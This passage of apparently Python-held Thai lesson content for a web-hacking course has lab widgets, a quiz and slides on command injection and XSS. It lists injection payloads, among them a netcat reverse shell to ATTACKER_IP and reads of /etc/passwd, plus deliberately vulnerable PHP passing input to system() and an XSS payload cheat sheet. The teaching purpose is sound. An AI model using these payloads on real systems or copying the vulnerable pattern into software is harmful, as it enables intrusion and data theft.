- **การโจมตีผ่าน Command Injection**: หากแฮกเกอร์ป้อนอินพุตเป็น `8.8.8.8 ; cat /etc/passwd` คำสั่งที่รันจริงในระบบปฏิบัติการหลังบ้านจะกลายเป็น:
  ```bash
  ping -c 4 8.8.8.8 ; cat /etc/passwd
  ```
  ทำให้เครื่องแม่ข่ายของเซิร์ฟเวอร์ยอมรับการทำงานรันคำสั่งดึงไฟล์รายชื่อผู้ใช้ออกมาแสดงทันที
"""


val178_1 = """### 💻 Directory & HTTP Diagnostic Sandbox (จำลองค้นหาไฟล์และยิงคำสั่ง)

คลิกหัวข้อด้านซ้ายมือเพื่อศึกษาตัวอย่างการทำแล็บจำลองความปลอดภัย และ **กดปุ่มรันจำลองการทำงานจริง (Run Simulation)** เพื่อดูผลลัพธ์:

<style type="text/css">
.w-sandbox-main { display: flex !important; gap: 20px !important; margin: 1.5rem auto !important; max-width: 1000px !important; }
.w-sandbox-nav { width: 220px !important; display: flex !important; flex-direction: column !important; gap: 8px !important; flex-shrink: 0 !important; }
.w-nav-item { background: rgba(255, 255, 255, 0.02) !important; border: 1px solid rgba(255, 255, 255, 0.06) !important; border-radius: 6px !important; padding: 10px 14px !important; color: #cbd5e1 !important; text-align: left !important; cursor: pointer !important; font-size: 0.78rem !important; transition: all 0.2s !important; }
.w-nav-item:hover, .w-nav-item.active { border-color: #a855f7 !important; color: #ffffff !important; background: rgba(168, 85, 247, 0.05) !important; }
.w-nav-item.active { font-weight: 700 !important; box-shadow: 0 0 8px rgba(168, 85, 247, 0.15) !important; }
.w-sandbox-panels { flex-grow: 1 !important; display: flex !important; flex-direction: column !important; gap: 14px !important; }
.w-sand-panel { display: none; background: #05070f !important; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important; }
.w-sand-panel.active { display: block !important; }
</style>
<div class="w-sandbox-main" style="display: flex; gap: 20px; margin: 1.5rem auto; max-width: 1000px;">
<div class="w-sandbox-nav" style="width: 220px; display: flex; flex-direction: column; gap: 8px; flex-shrink: 0;">
<button id="nav-item-dirb" class="w-nav-item active" style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 6px; padding: 10px 14px; color: #cbd5e1; text-align: left; cursor: pointer; font-size: 0.78rem; transition: all 0.2s;" onclick="showSandboxItem('dirb', this)">1. Dirb Backup Scan</button>
<button id="nav-item-curl" class="w-nav-item" style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 6px; padding: 10px 14px; color: #cbd5e1; text-align: left; cursor: pointer; font-size: 0.78rem; transition: all 0.2s;" onclick="showSandboxItem('curl', this)">2. cURL HTTP Audit</button>
</div>
<div class="w-sandbox-panels" style="flex-grow: 1; display: flex; flex-direction: column; gap: 14px;">
<div id="panel-dirb" class="w-sand-panel active" style="background: #05070f; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 10px; padding: 20px; box-shadow: 0 8px 24px rgba(0,0,0,0.45);">
<div style="font-size: 0.95rem; font-weight: 800; color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center;">
<span>1. Brute-forcing Web Backups with Dirb</span>
<span style="font-size: 0.65rem; padding: 2px 8px; border-radius: 4px; background: rgba(168,85,247,0.08); border: 1px solid rgba(168,85,247,0.2); color: #a855f7; font-family: monospace;">Dirb Scanner</span>
</div>
<pre style="font-family: monospace; font-size: 0.8rem; color: #a855f7; white-space: pre-wrap; margin: 0 0 12px; background: rgba(0,0,0,0.2); padding: 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">dirb http://ctf.rpca.ac.th/ /usr/share/wordlists/dirb/common.txt -X .zip,.bak</pre>
<div style="background: #02040a; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 16px; overflow: hidden;">
<div style="background: rgba(255,255,255,0.03); padding: 6px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center;">
<span style="font-size: 0.65rem; color: #64748b; font-weight: 800; letter-spacing: 0.06em; font-family: monospace;">🐚 Terminal Console</span>
<button style="background: rgba(168,85,247,0.1); border: 1px solid rgba(168,85,247,0.3); border-radius: 4px; color: #a855f7; font-size: 0.68rem; padding: 3px 8px; cursor: pointer; font-family: monospace; font-weight: 700; transition: all 0.15s;" onclick="startWebSim('dirb')">▶ Run Simulation</button>
</div>
<div id="term-dirb" style="font-family: monospace; font-size: 0.76rem; color: #a7f3d0; padding: 12px 16px; white-space: pre-wrap; min-height: 90px;">
<span style="color: #3ddc84;">kali$</span> [กดปุ่ม Run Simulation เพื่อยิงคำสั่ง Dirb]
</div>
</div>
<div style="background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-radius: 8px; padding: 16px; font-size: 0.83rem; color: #cbd5e1; line-height: 1.65;">
<h5 style="margin: 0 0 8px; font-size: 0.85rem; color: #fbbf24; font-weight: bold;">⚙️ Command Description</h5>
<p style="margin: 0;">คำสั่งค้นหาไฟล์สำรอง (เช่น .zip หรือ .bak) ในรากโฮสต์เป้าหมาย เพื่อตรวจจับความเสื่อมสภาพของข้อมูลสำคัญ</p>
</div>
</div>
<div id="panel-curl" class="w-sand-panel" style="background: #05070f; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 10px; padding: 20px; box-shadow: 0 8px 24px rgba(0,0,0,0.45); display: none;">
<div style="font-size: 0.95rem; font-weight: 800; color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center;">
<span>2. cURL HTTP OPTIONS Audit</span>
<span style="font-size: 0.65rem; padding: 2px 8px; border-radius: 4px; background: rgba(168,85,247,0.08); border: 1px solid rgba(168,85,247,0.2); color: #a855f7; font-family: monospace;">cURL Tool</span>
</div>
<pre style="font-family: monospace; font-size: 0.8rem; color: #a855f7; white-space: pre-wrap; margin: 0 0 12px; background: rgba(0,0,0,0.2); padding: 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">curl -X OPTIONS -i http://ctf.rpca.ac.th/</pre>
<div style="background: #02040a; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 16px; overflow: hidden;">
<div style="background: rgba(255,255,255,0.03); padding: 6px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center;">
<span style="font-size: 0.65rem; color: #64748b; font-weight: 800; letter-spacing: 0.06em; font-family: monospace;">🐚 Terminal Console</span>
<button style="background: rgba(168,85,247,0.1); border: 1px solid rgba(168,85,247,0.3); border-radius: 4px; color: #a855f7; font-size: 0.68rem; padding: 3px 8px; cursor: pointer; font-family: monospace; font-weight: 700; transition: all 0.15s;" onclick="startWebSim('curl')">▶ Run Simulation</button>
</div>
<div id="term-curl" style="font-family: monospace; font-size: 0.76rem; color: #a7f3d0; padding: 12px 16px; white-space: pre-wrap; min-height: 90px;">
<span style="color: #3ddc84;">kali$</span> [กดปุ่ม Run Simulation เพื่อรันคำสั่ง cURL]
</div>
</div>
<div style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 8px; padding: 16px; font-size: 0.83rem; color: #cbd5e1; line-height: 1.65;">
<h5 style="margin: 0 0 8px; font-size: 0.85rem; color: #fbbf24; font-weight: bold;">⚙️ Command Description</h5>
<p style="margin: 0;">เมธอด OPTIONS ใช้ทดสอบเพื่อขอข้อมูลรายการ HTTP methods ทั้งหมดที่เว็บเซิร์ฟเวอร์เปิดไว้ทำงาน</p>
</div>
</div>
</div>
</div>
<script>
window.showSandboxItem = function(itemKey, element) {
  const navButtons = document.querySelectorAll('.w-sandbox-nav button');
  navButtons.forEach(btn => {
    btn.style.borderColor = 'rgba(255, 255, 255, 0.06)';
    btn.style.color = '#cbd5e1';
    btn.style.background = 'rgba(255, 255, 255, 0.02)';
  });
  element.style.borderColor = '#a855f7';
  element.style.color = '#ffffff';
  element.style.background = 'rgba(168, 85, 247, 0.05)';
  const panels = document.querySelectorAll('.w-sand-panel');
  panels.forEach(p => { p.style.display = 'none'; });
  const target = document.getElementById('panel-' + itemKey);
  if (target) { target.style.display = 'block'; }
}
window.startWebSim = function(itemKey) {
  const term = document.getElementById('term-' + itemKey);
  if (!term) return;
  term.innerHTML = '<span style="color:#64748b;">kali$</span> <span style="color:#ffffff; font-weight:bold;">Running audit checks...</span>\\n[.] Connecting target server...';
  setTimeout(() => {
    if (itemKey === 'dirb') {
      term.innerHTML = '<span style="color:#64748b;">kali$</span> <span style="color:#3ddc84; font-weight:bold;">DIRB scan results:</span>\\nFOUND: http://ctf.rpca.ac.th/backup.zip (CODE: 200)\\nFOUND: http://ctf.rpca.ac.th/old_site.bak (CODE: 200)\\n\\n[+] Dirb completed successfully!';
    } else if (itemKey === 'curl') {
      term.innerHTML = '<span style="color:#64748b;">kali$</span> <span style="color:#a855f7; font-weight:bold;">HTTP/1.1 200 OK</span>\\nAllow: GET, POST, OPTIONS, TRACE, WebDAV\\nServer: Apache/2.4.41 (Ubuntu)\\nContent-Length: 0\\n\\n[+] OPTIONS check finished.';
    }
  }, 1000);
}
</script>"""

val178_2 = """### ✏️ Lesson Quick Quiz (แบบทดสอบทบทวนความรู้ท้ายบทเรียน)

ตอบคำถามประเมินความรู้ 2 ข้อด้านล่างนี้ให้ถูกต้องครบถ้วนเพื่อทำการบันทึกความสำเร็จและปลดล็อกปุ่มบทเรียนถัดไป:

<div class="row align-items-center" style="margin:1.5rem auto; max-width:980px;"><div class="col-md-8"><div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;"><p class="text-white mb-3" style="font-size:0.88rem; font-weight:600;">1. ช่องโหว่ประเภทใดเกิดขึ้นจากการที่เซิร์ฟเวอร์นำอินพุตของผู้ใช้ไปเรียกประมวลผลเป็นคำสั่งระบบปฏิบัติการโดยตรง?</p><div class="options-container" data-q="q1"><label class="w-quiz-option"><input type="radio" name="inj_type" value="SQLi" data-hash="false">SQL Injection</label><label class="w-quiz-option"><input type="radio" name="inj_type" value="Command Injection" data-hash="23c7f5c90b6b80d90bd93d8435d648b26e03fb21884be5e38f6b864a66e4a2cd">Command Injection</label><label class="w-quiz-option"><input type="radio" name="inj_type" value="XSS" data-hash="false">Cross-Site Scripting (XSS)</label><label class="w-quiz-option"><input type="radio" name="inj_type" value="LFI" data-hash="false">Local File Inclusion (LFI)</label></div><button class="btn btn-warning px-4 mt-2 text-dark font-weight-bold" type="button" onclick="verifyMultipleChoice(this)"><i class="fas fa-paper-plane mr-1"></i> Submit</button><div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div></div><div class="question-cell p-4 mb-3" style="background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.04); border-radius:8px;"><p class="text-white mb-3" style="font-size:0.88rem; font-weight:600;">2. คิวรีเป้าหมายพิเศษระดับมาตรฐาน \' OR 1=1 -- นิยมใช้ส่งเข้าไปในฐานข้อมูลเพื่อทำลายเงื่อนไขข้อใด?</p><div class="options-container" data-q="q2"><label class="w-quiz-option"><input type="radio" name="sqli_opt" value="Data Exfiltration" data-hash="false">ขโมยดูข้อมูลทั้งหมด (Data Exfiltration)</label><label class="w-quiz-option"><input type="radio" name="sqli_opt" value="Bypass Auth" data-hash="a95aa975765796245d8b8ff716d0046522bb33f749eb721867c4e515d18d451">ข้ามขั้นตอนตรวจสอบยืนยันตน (Bypass Authentication)</label><label class="w-quiz-option"><input type="radio" name="sqli_opt" value="DoS" data-hash="false">ทำลายเซิร์ฟเวอร์ระบบล่ม (Denial of Service)</label><label class="w-quiz-option"><input type="radio" name="sqli_opt" value="Password cracking" data-hash="false">ค้นหารหัสผ่านระบบ (Password Cracking)</label></div><button class="btn btn-warning px-4 mt-2 text-dark font-weight-bold" type="button" onclick="verifyMultipleChoice(this)"><i class="fas fa-paper-plane mr-1"></i> Submit</button><div class="feedback-msg mt-2" style="display:none; font-size:0.8rem; border-radius:4px; padding:6px 12px;"></div></div></div><div class="col-md-4 text-center"><div class="p-4" style="background:rgba(255,255,255,0.01); border:1px solid rgba(255,255,255,0.03); border-radius:12px; min-height:220px; display:flex; flex-direction:column; justify-content:center; align-items:center;"><span class="text-muted d-block mb-3" style="font-size:0.75rem; text-transform:uppercase; letter-spacing:0.1em;">Lesson Progress</span><div class="neon-gauge-container"><svg class="neon-gauge" viewBox="0 0 36 36"><path class="neon-gauge-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" /><path class="neon-gauge-fill" id="lesson-gauge-fill" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" /><text x="18" y="20.35" class="neon-gauge-text" id="lesson-gauge-text">0%</text></svg></div><span id="lesson-status-txt" class="mt-3 d-block text-muted" style="font-size:0.78rem;">โปรดตอบคำถามให้ครบ 2 ข้อ</span></div></div></div>
<style>
.neon-gauge-container {position:relative; width:120px; height:120px;}
.neon-gauge {width:100%; height:100%;}
.neon-gauge-bg {fill:none; stroke:rgba(255,255,255,0.05); stroke-width:2.8;}
.neon-gauge-fill {fill:none; stroke:#a855f7; stroke-width:2.8; stroke-linecap:round; transition:stroke-dasharray 0.5s ease, stroke 0.5s ease; filter:drop-shadow(0 0 5px rgba(168,85,247,0.5));}
.neon-gauge-text {fill:#ffffff; font-family:\'JetBrains Mono\',monospace; font-size:9px; font-weight:800; text-anchor:middle; filter:drop-shadow(0 0 2px rgba(255,255,255,0.3));}
</style>
<script>
const lessonKey = 'solved_lesson_178';
function getSavedSolves() { try { return JSON.parse(localStorage.getItem(lessonKey) || '[]'); } catch(e) { return []; } }
function updateLocalProgress() {
  const solved = getSavedSolves();
  const total = 2;
  const percent = Math.round((solved.length / total) * 100);
  const fill = document.getElementById('lesson-gauge-fill');
  const text = document.getElementById('lesson-gauge-text');
  const status = document.getElementById('lesson-status-txt');
  if (fill) fill.setAttribute('stroke-dasharray', `${percent}, 100`);
  if (text) text.textContent = `${percent}%`;
  if (solved.length === total) {
    if (fill) fill.style.stroke = '#3ddc84';
    if (status) status.innerHTML = '<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> ปลดล็อกบทเรียนถัดไปแล้ว</span>';
  } else {
    if (fill) fill.style.stroke = '#a855f7';
    if (status) status.textContent = `ทำเสร็จแล้ว ${solved.length}/${total} ข้อ`;
  }
}
document.addEventListener('click', function(e) {
  const label = e.target.closest('.w-quiz-option');
  if (label) {
    const container = label.closest('.options-container');
    if (container) {
      container.querySelectorAll('.w-quiz-option').forEach(opt => opt.classList.remove('selected'));
      label.classList.add('selected');
      const radio = label.querySelector('input[type="radio"]');
      if (radio) radio.checked = true;
    }
  }
});
window.verifyMultipleChoice = function(button) {
  const cell = button.closest('.question-cell');
  const selectedRadio = cell.querySelector('input[type="radio"]:checked');
  const feedback = cell.querySelector('.feedback-msg');
  if (!selectedRadio) {
    feedback.className = "feedback-msg mt-2 alert-warning py-1.5 px-3 text-dark";
    feedback.innerHTML = '<i class="fas fa-exclamation-triangle mr-1"></i> กรุณาเลือกคำตอบ';
    feedback.style.setProperty('display', 'block', 'important');
    return;
  }
  const hashVal = selectedRadio.getAttribute('data-hash');
  if (hashVal !== 'false') {
    feedback.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
    feedback.innerHTML = '<i class="fas fa-check-circle mr-1"></i> คำตอบถูกต้อง!';
    feedback.style.setProperty('display', 'block', 'important');
    cell.querySelectorAll('input[type="radio"]').forEach(r => r.disabled = true);
    cell.querySelectorAll('.w-quiz-option').forEach(opt => opt.style.pointerEvents = 'none');
    button.disabled = true;
    const solved = getSavedSolves();
    if (!solved.includes(hashVal)) {
      solved.push(hashVal);
      localStorage.setItem(lessonKey, JSON.stringify(solved));
    }
    updateLocalProgress();
  } else {
    feedback.className = "feedback-msg mt-2 alert-danger py-1.5 px-3 text-white bg-danger border-0";
    feedback.innerHTML = '<i class="fas fa-times-circle mr-1"></i> คำตอบไม่ถูกต้อง ลองใหม่!';
    feedback.style.setProperty('display', 'block', 'important');
  }
}
setTimeout(() => {
  const solved = getSavedSolves();
  document.querySelectorAll('.options-container').forEach(container => {
    container.querySelectorAll('input[type="radio"]').forEach(radio => {
      const hash = radio.getAttribute('data-hash');
      if (solved.includes(hash)) {
        radio.checked = true;
        const label = radio.closest('.w-quiz-option');
        if (label) label.classList.add('selected');
        container.querySelectorAll('input[type="radio"]').forEach(r => r.disabled = true);
        container.querySelectorAll('.w-quiz-option').forEach(opt => opt.style.pointerEvents = 'none');
        const cell = container.closest('.question-cell');
        if (cell) {
          const btn = cell.querySelector('button');
          if (btn) btn.disabled = true;
          const fb = cell.querySelector('.feedback-msg');
          if (fb) {
            fb.className = "feedback-msg mt-2 alert-success py-1.5 px-3 text-dark";
            fb.innerHTML = '<i class="fas fa-check-circle mr-1"></i> เรียบร้อยแล้ว';
            fb.style.setProperty('display', 'block', 'important');
          }
        }
      }
    });
  });
  updateLocalProgress();
}, 200);
</script>"""

# ─── Lesson 179 ───
val179_0 = """## 🎭 Web Exploitation Deep Dive (เจาะลึกช่องโหว่เว็บระดับก้าวหน้า)
---

ยินดีต้อนรับสู่บทเรียนเจาะลึกประเภทการโจมตีทางเว็บ: Command Injection, Cross-Site Scripting (XSS), File Inclusion และ Brute Force Attacks พร้อมเทคนิคการทำงานร่วมกับเครื่องมือและสคริปต์เจาะระบบ

### 📄 SLIDE 121-125: Command Injections: Payloads ( Linux & Windows )
ตารางรวบรวมคำสั่ง Payload ที่ใช้ทดสอบช่องโหว่เพื่อรันคำสั่งบนระบบปฏิบัติการผ่านเว็บเบราว์เซอร์:

<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 12px; font-weight: bold; width: 220px;">สัญลักษณ์/Payload</th>
<th style="padding: 12px; font-weight: bold;">บทบาทหน้าที่การทำงาน (Description)</th>
<th style="padding: 12px; font-weight: bold; width: 150px;">ระบบปฏิบัติการ</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">; ls -l</td>
<td style="padding: 12px;">สั่งให้รันคำสั่งแสดงรายละเอียดไฟล์ (ls) หลังคำสั่งแรกทำงานเสร็จ</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">; id</td>
<td style="padding: 12px;">สั่งรันเพื่อดูข้อมูลผู้ใช้งานปัจจุบัน (User ID, Group ID)</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">&amp; whoami</td>
<td style="padding: 12px;">ใช้ตัวเชื่อม <code>&amp;</code> เพื่อสั่งแสดงชื่อผู้ใช้อัตโนมัติ (นิยมใช้หากเซิร์ฟเวอร์บล็อกเครื่องหมาย <code>;</code>)</td>
<td style="padding: 12px; color: #fb7185;">Linux / Windows</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">&amp; echo vulnerable</td>
<td style="padding: 12px;">พิมพ์แสดงข้อความประเมินเบื้องต้นว่าเว็บสามารถรันคำสั่งได้หรือไม่</td>
<td style="padding: 12px; color: #fb7185;">Linux / Windows</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">`cat /etc/passwd`</td>
<td style="padding: 12px;">สั่งดึงไฟล์รายชื่อบัญชีผู้ใช้ในระบบ Linux ด้วยการใช้เครื่องหมาย Backticks</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">$(whoami)</td>
<td style="padding: 12px;">แทรกรันคำสั่งแสดงชื่อผู้ใช้แบบครอบสัญลักษณ์เพื่อเลี่ยงตัวกรองคัดกรองอักขระ</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">$(cat /etc/passwd)</td>
<td style="padding: 12px;">แทรกดึงไฟล์ผู้ใช้อัตโนมัติด้วยคำสั่งผ่านสัญลักษณ์ดักจับเพื่อเลี่ยงตัวกรอง</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">; nc -e /bin/sh &lt;ATTACKER_IP&gt; 4444</td>
<td style="padding: 12px;">คำสั่งสร้าง Reverse Shell เชื่อมต่อ Terminal สิทธิ์เครื่องเซิร์ฟเวอร์กลับไปหาแฮกเกอร์</td>
<td style="padding: 12px; color: #38bdf8;">Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.15);">
<td style="padding: 12px; font-family: monospace; color: #f43f5e; font-weight: bold;">; net user Administrator /domain</td>
<td style="padding: 12px;">สั่งตรวจสอบแสดงรายชื่อผู้ดูแลระบบในตาราง AD Windows Server</td>
<td style="padding: 12px; color: #fbbf24;">Windows</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 126-130: ตัวอย่างจริงของการยิงเจาะระบบผ่าน Command Injections

#### 💻 1. โค้ดภาษา PHP บนเซิร์ฟเวอร์ที่มีช่องโหว่ (Vulnerable PHP Source)
```php
<?php
    // รับค่าพารามิเตอร์ 'cmd' จากผู้ใช้โดยตรง
    $cmd = $_GET['cmd'];
    
    // เรียกใช้งานคำสั่งระดับระบบปฏิบัติการโดยไม่มีการตรวจสอบหรือหลีกเลี่ยงอักขระพิเศษ
    system("ping -c 1 " . $cmd);
?>
```

#### 🌐 2. การโจมตีผ่านบราวเซอร์ (Web Browser Injection Examples)
แฮกเกอร์สามารถส่ง Payload บายพาสต่อหลังคำสั่ง Ping ได้ดังนี้:
- **ดูชื่อผู้ใช้งานของระบบ**:
  `http://target.com/vuln.php?cmd=;whoami`
- **ดูรหัสประจำตัวผู้รัน**:
  `http://target.com/vuln.php?cmd=$(id)`
- **ดึงรายชื่อไฟล์ทั้งหมด (แบบ URL-encoded ช่องว่าง)**:
  `http://target.com/vuln.php?cmd=;%20ls%20-l`  *(มีค่าเท่ากับ `; ls -l`)*

#### 🐚 3. การโจมตีและขโมยข้อมูลโดยใช้โปรแกรม Bash (cURL POST Method)
แฮกเกอร์สามารถใช้คำสั่ง Terminal บนเครื่องตนเองเพื่อยิงดึงไฟล์ระบบของเป้าหมายและส่งค่ากลับผ่าน HTTP POST:
```bash
curl -X POST -d "cmd=$(cat /etc/passwd)" http://target.com/vuln.php
```

---

### 📄 SLIDE 131-135: Cross-Site Scripting (XSS) Introduction
- **คำจำกัดความ**: Cross-Site Scripting (XSS) คือหนึ่งในภัยคุกคามฝั่ง Client-Side เกิดขึ้นเมื่อผู้พัฒนาละเลยการคัดกรองหรือแปลงอักขระพิเศษในอินพุต ปล่อยให้ผู้ประสงค์ร้ายสามารถแทรกโค้ดสคริปต์ประสงค์ร้าย (โดยมากมักเขียนด้วยภาษา **JavaScript**) เข้าสู่หน้าเพจของเว็บแอปพลิเคชัน
- **เป้าหมายและผลกระทบ**: เมื่อมีผู้ใช้งานทั่วไปโหลดหน้าเพจนั้น สคริปต์จะถูกเรียกทำงานบนเบราว์เซอร์ของเหยื่อทันที เพื่อดึงคีย์ตรวจสอบสิทธิ์ (Session Tokens), คุกกี้ความลับ (Cookies), ขโมยรหัสผ่าน หรือทำธุรกรรมปลอมในนามของเหยื่อ
- **ศึกษาประเด็นเพิ่มเติม**: [Cross-Site Scripting Web Application Security](https://www.spanning.com/blog/cross-site-scripting-web-based-application-security-part-3/)

---

### 📄 SLIDE 136-140: ประเภทของช่องโหว่ Cross-Site Scripting (XSS)

#### 🎭 1. Stored XSS (Persistent XSS - แบบบันทึกถาวร)
- **หลักการ**: โค้ดสคริปต์ประสงค์ร้ายจะถูกส่งเข้าไป **บันทึกเก็บไว้ในฐานข้อมูล (Database)** ของเซิร์ฟเวอร์โดยตรง (เช่น ในกล่องข้อความเว็บบอร์ด, ความคิดเห็น, รายละเอียดสินค้า)
- เมื่อมีผู้ใช้งานคนอื่นเปิดเข้ามาชมหน้านั้นในอนาคต สคริปต์จะทำงานบนบราวเซอร์ของพวกเขาทุกครั้งแบบอัตโนมัติ
- **ตัวอย่าง Payload**:
  ```html
  <script>alert('Stored XSS Vulnerable!');</script>
  ```

#### 🎭 2. Reflected XSS (Non-Persistent XSS - แบบสะท้อนกลับ)
- **หลักการ**: สคริปต์แนบมาเป็น **ส่วนหนึ่งของ URL ลิงก์หรือพารามิเตอร์คำสั่งขอใช้งาน (Request)** เมื่อเซิร์ฟเวอร์นำข้อมูลอินพุตจาก URL นั้นกลับมาวาดหน้าเว็บตอบกลับทันทีโดยไม่ได้เก็บบันทึกในระบบ
- **ตัวอย่างลิงก์โจมตี**:
  `http://target.com/search?q=<script>alert('Reflected XSS');</script>`
- หากผู้ใช้กดคลิกลิงก์ที่แฮกเกอร์แนบมานี้ โค้ดประสงค์ร้ายจะทำงานในเครื่องของเหยื่อทันที

#### 🎭 3. DOM-Based XSS (แบบปรับแก้โครงสร้างเอกสารเว็บ)
- **หลักการ**: เกิดขึ้นบนฝั่งเครื่องผู้รับบริการโดยตรง (Client-Side JavaScript) โดยสคริปต์ที่แฮกเกอร์ส่งเข้ามาจะเข้าไปแก้ไขวัตถุใน **DOM (Document Object Model)** ของหน้าเว็บขณะที่ทำงาน โดยไม่มีการส่งข้อมูลหรือติดต่อคุยกับเว็บเซิร์ฟเวอร์หลังบ้านเลย
- **ตัวอย่างช่องโหว่**: หน้าเว็บรับค่าจาก Hash URL มาแสดงผลโดยตรง:
  `http://target.com/#<script>alert('DOM XSS')</script>`

---

### 📄 SLIDE 141-145: Common XSS Payloads Cheatsheet (ตารางรวบรวมคีย์เจาะระบบ XSS)
รายการ Payload ยอดนิยมในการทดสอบระบบความปลอดภัยเพื่อตรวจสอบความรัดกุมของหน้าเว็บ:

<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 10px; font-weight: bold; width: 320px;">คีย์เจาะระบบ XSS (Payload)</th>
<th style="padding: 10px; font-weight: bold;">ผลลัพธ์และคำอธิบาย (Description)</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #f43f5e;">&lt;script&gt;alert('XSS')&lt;/script&gt;</td>
<td style="padding: 10px;">การเรียกใช้งานคำสั่งพื้นฐานส่งข้อความแจ้งเตือนป๊อปอัพยืนยันช่องโหว่</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #f43f5e;">"&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;</td>
<td style="padding: 10px;">การส่งเครื่องหมายปิดคุณสมบัติเพื่อปิดแท็ก HTML เก่าก่อนหน้า แล้วบังคับแทรกแท็ก script ใหม่เข้ามาทำงาน</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #3b82f6;">&lt;img src=x onerror=alert('XSS')&gt;</td>
<td style="padding: 10px;">การใช้รูปภาพที่ไม่มีอยู่จริงเพื่อกระตุ้นให้เกิดเหตุการณ์ผิดพลาด (onerror) แล้วรันคำสั่งแฝง</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04)">
<td style="padding: 10px; font-family: monospace; color: #3b82f6;">&lt;svg/onload=alert('XSS')&gt;</td>
<td style="padding: 10px;">การแทรกโค้ดแบบใช้แท็กกราฟิก SVG เพื่อหลบเลี่ยงการดักจับข้อความคำว่า "script"</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15)">
<td style="padding: 10px; font-family: monospace; color: #fbbf24;">&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</td>
<td style="padding: 10px;">แทรกหน้าเอกสารกรอบ iframe ย่อยและสั่งให้ประมวลผลสคริปต์ในตำแหน่งต้นทางของกรอบ</td>
</tr>
